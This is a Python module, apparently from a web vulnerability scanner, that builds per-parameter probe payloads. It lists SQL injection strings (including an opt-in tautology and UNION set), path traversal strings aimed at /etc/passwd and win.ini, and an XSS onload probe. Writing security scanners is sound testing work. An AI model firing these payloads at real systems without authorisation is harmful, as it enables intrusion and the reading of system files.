"""Detection-oriented payload catalogue.

The default set only *provokes errors or reflections*; it never tries to read, modify or
delete data (no tautologies, UNION, DROP…). ``aggressive`` adds classic tautologies — only use
it against disposable databases.
"""

from __future__ import annotations

import random
import re
from dataclasses import dataclass

SQLI_SAFE = ["'", "\"", "')", "\\"]
SQLI_AGGRESSIVE = ["' OR '1'='1", "1 OR 1=1", "' UNION SELECT NULL--"]
TRAVERSAL = [
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
PATHY_NAME_RE = re.compile(
    r"(file|path|name|page|doc|template|include|dir|folder|download|img|image|src|load|view|"
    r"read|attachment|lang|layout|archivo|ruta)", re.I)


@dataclass(frozen=True)
class Payload:
    kind: str  # sqli | xss | traversal
    value: str
    marker: str | None = None


def new_marker(rng: random.Random) -> str:
    return "gtx" + "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))


def xss_payloads(marker: str) -> list[Payload]:
    # Quote-free first: a quote may trip a SQL error and hide the reflection.
    return [
        Payload("xss", f"<{marker}>", marker),
        Payload("xss", f"\"><{marker}>", marker),
        Payload("xss", f"<svg/onload=alert('{marker}')>", marker),
    ]


def looks_pathy(name: str, value: str = "") -> bool:
    return bool(PATHY_NAME_RE.search(name or "")) or bool(re.search(r"\.\w{2,4}$|/", value or ""))


def payloads_for(name: str, value: str, rng: random.Random, aggressive: bool = False,
                 allow_traversal: bool = True) -> list[Payload]:
    """Payloads to try on one parameter, in a deterministic order."""
    out = [Payload("sqli", p) for p in SQLI_SAFE[:2]]
    if aggressive:
        out += [Payload("sqli", p) for p in SQLI_AGGRESSIVE]
    out += xss_payloads(new_marker(rng))[:1]
    if allow_traversal and looks_pathy(name, value):
        out += [Payload("traversal", p) for p in TRAVERSAL[:2]]
    return out
